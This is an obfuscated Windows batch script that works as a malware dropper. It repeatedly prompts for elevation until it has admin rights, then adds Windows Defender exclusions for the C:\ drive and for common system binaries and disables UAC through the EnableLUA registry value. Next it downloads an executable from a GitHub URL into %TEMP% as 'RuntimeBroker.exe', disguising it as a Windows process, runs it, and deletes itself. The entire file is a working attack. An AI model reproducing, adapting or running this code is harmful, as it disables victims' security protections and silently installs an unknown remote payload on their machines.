@echo off & setlocal enableDelayedExpansion
set "imsSm=>nul" & set "lkoA=2>&1" & set "elWw=SESSION" & set "qDs=NET"
%qDs% %elWw% %imsSm% %lkoA%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "Hda=qux" & set "UpRrF=bar" & set "IMVs=baz" & set "nvz=foo" & rem HRwP lvIgOu ODkF
set "KkLO=powershell -ExecutionPolicy Bypass -Command"
set "CZChU=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "aNb='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "KmS='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!KkLO! "!CZChU! !aNb! !KmS!" %imsSm% %lkoA%
set "gfRVE=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "ORGp=-Name 'EnableLUA' -Value 0"
!KkLO! "!gfRVE! !ORGp!" %imsSm% %lkoA%
set "avoZ=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!KkLO! "!avoZ!" %imsSm% %lkoA%
if !errorlevel! neq 0 (goto %a%)
set "iVWT=timeout /t" & !iVWT! 2 %imsSm% %lkoA%
set "KIrn=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "yisnA=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "WFnmB=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!KkLO! "!KIrn! !yisnA! !WFnmB!" %imsSm% %lkoA%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!iVWT! 1 %imsSm% %lkoA% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %imsSm% %lkoA%
del /f /q "%~f0" %imsSm% %lkoA%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %imsSm% %lkoA%
if !errorlevel! neq 0 (!iVWT! 3 %imsSm% %lkoA% & goto %b%)
exit /b
